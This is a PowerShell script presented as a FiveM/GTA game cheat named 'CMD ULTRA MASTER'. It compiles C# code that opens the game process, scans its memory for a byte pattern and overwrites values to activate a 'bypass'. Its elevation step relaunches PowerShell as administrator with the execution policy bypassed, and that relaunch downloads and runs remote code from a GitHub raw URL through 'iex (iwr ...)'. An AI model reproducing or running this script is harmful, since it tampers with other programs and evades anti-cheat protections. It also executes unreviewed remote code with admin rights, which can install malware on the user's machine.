# ==========================================================
# PROJECT: CMD ULTRA MASTER (STABLE VERSION)
# NO HWID | NO SERVER | NO SCRIPT ERROR
# ==========================================================

try {
    # [1] ELEVATE TO ADMIN
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (iwr https://raw.githubusercontent.com/hxdes11/asdasd/main/asdasd)`"" -Verb RunAs; exit
    }

    # [2] STABLE CORE ENGINE (SINGLE CLASS)
    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    public class GhostMaster {
        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwAccess, bool bInherit, int dwPid);
        [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBase, byte[] lpBuffer, int nSize, out int lpWritten);
        [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBase, byte[] lpBuffer, int nSize, out int lpRead);

        public static IntPtr FindPattern(IntPtr hProc, byte[] pattern) {
            long start = 0x140000000; long end = 0x500000000;
            byte[] buffer = new byte[10485760]; int read;
            for (long i = start; i < end; i += buffer.Length - pattern.Length) {
                if (ReadProcessMemory(hProc, (IntPtr)i, buffer, buffer.Length, out read)) {
                    for (int j = 0; j < read - pattern.Length; j++) {
                        bool match = true;
                        for (int k = 0; k < pattern.Length; k++) {
                            if (buffer[j + k] != pattern[k]) { match = false; break; }
                        }
                        if (match) return (IntPtr)(i + j);
                    }
                }
            }
            return IntPtr.Zero;
        }
    }
"@
    # ตรวจสอบเพื่อไม่ให้เกิด Error "Type name already exists"
    if (-not ([System.Management.Automation.PSTypeName]"GhostMaster").Type) { Add-Type -TypeDefinition $Source }

    # [3] CONFIGURATION
    $P_SCAN = [byte[]](0xCD,0xCC,0x9C,0x40)
    $V_HIGH = [byte[]](0x92,0xC2,0xF5,0xBC,0x29,0x5C,0xA7,0x40,0x00,0x00,0x20,0x41,0x00,0x00,0x48,0x41)
    $V_LOW  = [byte[]](0x0A,0xD7,0xA3,0xBC,0xD7,0xA3,0xA0,0x40,0x00,0x00,0x20,0x41,0x00,0x00,0x48,0x41)

    cls
    Write-Host "----------------------------------------------------" -f Cyan
    Write-Host "          CMD ULTRA : FINAL MASTER READY            " -f Magenta
    Write-Host "----------------------------------------------------" -f Cyan
    Write-Host "[1] ULTRA HIGH  [2] ULTRA LOW" -f Yellow
    $Mode = Read-Host "SELECT"
    $Data = if ($Mode -eq "1") { $V_HIGH } else { $V_LOW }

    # [4] EXECUTION
    $Proc = Get-Process | Where-Object { $_.ProcessName -like "*FiveM*" -or $_.ProcessName -like "*GTAProcess*" } | Select-Object -First 1

    if ($Proc) {
        $Handle = [GhostMaster]::OpenProcess(0x1F0FFF, $false, $Proc.Id)
        Write-Host "[*] SCANNING RAM..." -f Magenta
        $Addr = [GhostMaster]::FindPattern($Handle, $P_SCAN)

        if ($Addr -ne [IntPtr]::Zero) {
            Write-Host "[+] TARGET LOCATED!" -f Green
            $Written = 0
            $RealAddr = [IntPtr]($Addr.ToInt64() - 4)
            if ([GhostMaster]::WriteProcessMemory($Handle, $RealAddr, $Data, $Data.Length, [ref]$Written)) {
                [Console]::Beep(1000, 500)
                Write-Host "[SUCCESS] BYPASS ACTIVE 100%!" -f Cyan
            }
        } else {
            Write-Host "[-] ERROR: PATTERN NOT FOUND (TRY RE-JOIN)" -f Red
        }
    } else {
        Write-Host "[-] ERROR: GAME NOT DETECTED" -f Red
    }

} catch {
    Write-Host "[!] CRITICAL ERROR: $($_.Exception.Message)" -f Red
}

Write-Host "`n----------------------------------------------------" -f Cyan
Read-Host "PRESS ENTER TO EXIT"
